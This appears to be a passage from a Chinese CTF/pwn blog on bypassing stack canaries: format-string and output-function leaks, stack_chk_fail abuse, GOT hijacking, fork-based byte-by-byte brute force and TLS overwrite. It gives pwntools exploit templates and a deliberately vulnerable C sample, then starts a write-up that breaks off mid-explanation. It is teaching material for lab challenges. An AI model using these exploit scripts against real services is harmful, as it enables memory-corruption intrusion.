<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa\n&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf28</span> --&gt; <span class="number">0xa</span> (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="number">10016</span>| <span class="number">0x7fffffffdf30</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10024</span>| <span class="number">0x7fffffffdf38</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10032</span>| <span class="number">0x7fffffffdf40</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdf48</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdf50</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10056</span>| <span class="number">0x7fffffffdf58</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10064</span>| <span class="number">0x7fffffffdf60</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10072</span>| <span class="number">0x7fffffffdf68</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10080</span>| <span class="number">0x7fffffffdf70</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10088</span>| <span class="number">0x7fffffffdf78</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10096</span>| <span class="number">0x7fffffffdf80</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10104</span>| <span class="number">0x7fffffffdf88</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10112</span>| <span class="number">0x7fffffffdf90</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10120</span>| <span class="number">0x7fffffffdf98</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10128</span>| <span class="number">0x7fffffffdfa0</span> --&gt; <span class="number">0x400a50</span> (push   r15)</span><br><span class="line"><span class="number">10136</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d00</span>            <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10144</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10152</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10160</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<p>可以计算出偏移为“17”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">formats(<span class="string">&quot;%23$p&quot;</span>)     <span class="comment">#这是64位系统 17+6=23</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)    <span class="comment">#用prinft打印的canary以‘0x’开头</span></span><br><span class="line">canary = <span class="built_in">eval</span>(<span class="string">b&#x27;0x&#x27;</span>+p.recv(<span class="number">16</span>))		<span class="comment">#canary有8个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
<p>​        //通常把gdb和终端结合起来看效果更好</p>
<h2 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h2><p>canary设计为以字节“\x00”结尾，而输出函数会被“\x00”中断，如果把“\x00”给覆盖了就可以利用输出函数来泄露canary</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10018</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10020</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10028</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10030</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10038</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d</span>+<span class="string">&#x27;\n&#x27;</span>         <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10050</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<p>这样canary结尾的“\x00”就被替换为了“\n”，后续的read函数就可以成功泄露canary</p>
<h2 id="利用stack-chk-fail的报错信息"><a href="#利用stack-chk-fail的报错信息" class="headerlink" title="利用stack_chk_fail的报错信息"></a>利用stack_chk_fail的报错信息</h2><p>前面两个都是常规的，这个就不一样了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">[<span class="number">1</span>]    <span class="number">3005</span> abort (core dumped)  ./newbie</span><br></pre></td></tr></table></figure>
<p>当canary被覆盖时，程序会进行上述报错</p>
<p>打印这些字符串的函数是“stack_chk_fail.c”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;debug/fortify_fail.c&quot;</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (msg)</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">char</span> *msg;</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"> __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line"> msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
<p>可以发现canary触发时会打印 “libc_argv[0]”，如果栈溢出覆盖了 “libc_argv[0]”，那么程序就会打印覆盖的内容</p>
<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641027667797-1643270848457.png" class width="1641027667797">  
<p>​        // libc_argv[0]装有<strong>指向程序地址</strong>的指针</p>
<p>这种操作只能泄露指针的内容，并且需要目标指针的地址来覆盖 “libc_argv[0]” ，所以“libc_argv[0]” 相当于输入值的偏移也需要掌握</p>
<p>​        // 如果存在“fork”，还可以利用这种方式来打印“libc_base”</p>
<h2 id="stack-chk-fail劫持"><a href="#stack-chk-fail劫持" class="headerlink" title="stack_chk_fail劫持"></a>stack_chk_fail劫持</h2><p>canary报错时会调用 <strong>_stack_chk_fail</strong> ，那么劫持 <strong>_stack_chk_fail</strong> 当然也是一种攻击手段</p>
<p>这个一般通过GOT表劫持该函数，所以不能开启 <strong>Full RELRO</strong> 保护</p>
<p>像printf格式化漏洞WAA，或者堆溢出WAA，都可以改写GOT表内容，甚至配合UAF和数组越位也可以改写GOT表（如果合适的话）</p>
<h2 id="one-by-one爆破"><a href="#one-by-one爆破" class="headerlink" title="one-by-one爆破"></a>one-by-one爆破</h2><p>一般来说，爆破canary是很蠢的事情，因为每次运行程序canary都会改变</p>
<p>但是存在一类通过fork函数开启子进程交互的题目，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		pid = fork();		<span class="comment">//fork开启子进程</span></span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">			fun();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line">padding = <span class="string">&#x27;a&#x27;</span>*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) </span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;recv&#x27;</span> <span class="keyword">in</span> a:	</span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(<span class="number">0x0804864d</span>))</span><br><span class="line"></span><br><span class="line">flag = cn.recv()</span><br><span class="line">cn.close()</span><br><span class="line">log.success(<span class="string">&#x27;flag is:&#x27;</span> + flag)</span><br><span class="line"><span class="comment">#32位为‘3’,64位为‘7’</span></span><br></pre></td></tr></table></figure>
<p>这个模板可以说是经典了，遇到此类题目后改一改就好了</p>
<h2 id="覆盖TLS中储存的canary值"><a href="#覆盖TLS中储存的canary值" class="headerlink" title="覆盖TLS中储存的canary值"></a>覆盖TLS中储存的canary值</h2><p>canary的值存储在fs:[0x28]中</p>
<p>fs寄存器是由glibc定义的，存放Thread Local Storage （TLS）信息</p>
<p>该结构体如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">        <span class="keyword">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="keyword">int</span> multiple_threads;</span><br><span class="line">        <span class="keyword">int</span> gscope_flag;</span><br><span class="line">        <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="keyword">uintptr_t</span> stack_guard;   <span class="comment">/* canary，0x28偏移 */</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">        ……</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
<p>这个 <strong>stack_guard</strong> 是在 <strong>libc_start_main</strong> 中进行设置和赋值的</p>
<p>一般来说，我们不知道TLS的位置，需要爆破脚本来找出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">offset=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./xxxx&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>				   </span><br><span class="line">    payload += (padding-<span class="number">8</span>)	 	     <span class="comment">#padding</span></span><br><span class="line">    payload += <span class="string">&#x27;aaaaaaaa&#x27;</span>		     <span class="comment">#fake canary </span></span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)		 <span class="comment">#rbp</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)			    <span class="comment">#返回地址</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span>*(offset-<span class="built_in">len</span>(payload))</span><br><span class="line">    p.send(payload)</span><br><span class="line">    temp = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxx&quot;</span> <span class="keyword">in</span> temp:</span><br><span class="line">        <span class="built_in">print</span>(offset)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">原本程序覆盖了canary是一定会报错的，但是payload后续填入的“a”可能会覆盖TLS，使程序通过canary</span></span><br><span class="line"><span class="string">只要程序通过了canary，‘p.recvall()’就会不接受到报错信息（stack_chk_fail）</span></span><br><span class="line"><span class="string">这之后我们就可以通过打印出的offset来计算偏移了</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>当然也可以不找偏移，直接一次性填入非常长的“a”也是可以覆盖的</p>
<p>覆盖TLS的方法只能在有“pthread_create”的题中可以用用，不然程序就很可能会覆盖关键数据，然后直接挂掉</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">canary爆破未遂+数据接收技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-04 22:03:51" itemprop="dateCreated datePublished" datetime="2022-01-04T22:03:51+08:00">2022-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-05 20:22:34" itemprop="dateModified" datetime="2022-01-05T20:22:34+08:00">2022-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天遇到一个题目，有canary并且在循环中用fork生成子进程，当时想都没有想就开始canary爆破，仔细分析代码后才发现出题人的阴险，先用fork引诱我进行canary爆破，等我把爆破脚本写好了再搞我一手，我现在真的怀疑这人是学社工的</p>
<p>通过学习其他大佬的WP，我了解到了一种新的接受数据的方式</p>
<p>这种方式在程序使用“printf”进行输出的时候还挺好用的</p>
<hr>
<p><strong>canary爆破未遂+数据接收技巧</strong></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288175862.png" alt="1641288175862">  </p>
<p>循环输入</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641287256715.png" alt="1641287256715"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641287265290.png" alt="1641287265290"> </p>
<p>32位，dynamically，开了NX，开了canary</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288063874.png" alt="1641288063874"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288075846.png" alt="1641288075846"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288084647.png" alt="1641288084647"> </p>
<p><strong>代码分析</strong></p>
<p>getchar接受到“Y”后程序继续执行，然后getchar接收“Y”之后的字符（防止溢出）</p>
<p>fork函数执行以后，程序就把它自己复制了一遍，并且优先执行新进程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）在父进程中，fork返回新创建子进程的进程ID</span><br><span class="line"><span class="number">2</span>）在子进程中，fork返回<span class="number">0</span></span><br><span class="line"><span class="number">3</span>）如果出现错误，fork返回一个负值</span><br></pre></td></tr></table></figure>
<p>也就是说，返回“0”的子进程会进入函数“sub_8048B29”，而父进程不会</p>
<p>父进程会进行循环，源源不断地产生子进程</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/love-jelly-pig/p/8471206.html">fork()函数详解</a></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641289340337.png" alt="1641289340337"> </p>
<p>子进程会触发函数“read”，输入“0x200”字节到“malloc”分配的空间“buf”</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641289574670.png" alt="1641289574670"> </p>
<p>for循环会一直增加“i”的值，直到条件成立，然后“buf[i]”会被赋值为“0”</p>
<p>并且“i”必须为“4”的倍数（包括“0”）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    data = i &amp; <span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<p>把“buf”赋值给“dest”后返回“1”，后面就是一个算法，通过一系列的位移操作使四个变成三个字符</p>
<p>​        // 其实就是base64加密</p>
<p><strong>入侵思路</strong></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641290228902.png" alt="1641290228902"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641291871253.png" alt="1641291871253"> </p>
<p>“buf”和“dest”都在堆中，那么溢出点在那里呢？</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641292428016.png" alt="1641292428016"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641292662924.png" alt="1641292662924"> </p>
<p>程序把“dest”进行加密，赋值给“v21”了</p>
<p>“dest”可以装“0x200”字节，而“v21”只能装“258”字节，计算得溢出了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x200</span> * <span class="number">3</span> / <span class="number">4</span> = <span class="number">384</span> &gt; <span class="number">269</span> <span class="comment">#在IDA上看的偏移  </span></span><br></pre></td></tr></table></figure>
<p>接下来就是考虑泄露Canary</p>
<p>一般程序涉及到“进程”和“线程”的时候，就会出现两种对应的canary绕过手段，前者为“canary爆破”，后者为“覆盖TLS”，这里使用前者</p>
<p>因为函数“fork”产生的字进程完全克隆父进程，canary也一样，所以这里可以采用canary爆破的方式，一字节一字节爆破canary</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment">#32位为‘3’,64位为‘7’</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        p.send( padding + canary + <span class="built_in">chr</span>(i)) <span class="comment">#从0~0xFF，依次注入</span></span><br><span class="line">        a = p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">in</span> a: </span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>重点就是这个“xxxx”写什么，程序的输出就只有这3种情况：</p>
<p>1.子进程正常结束：</p>
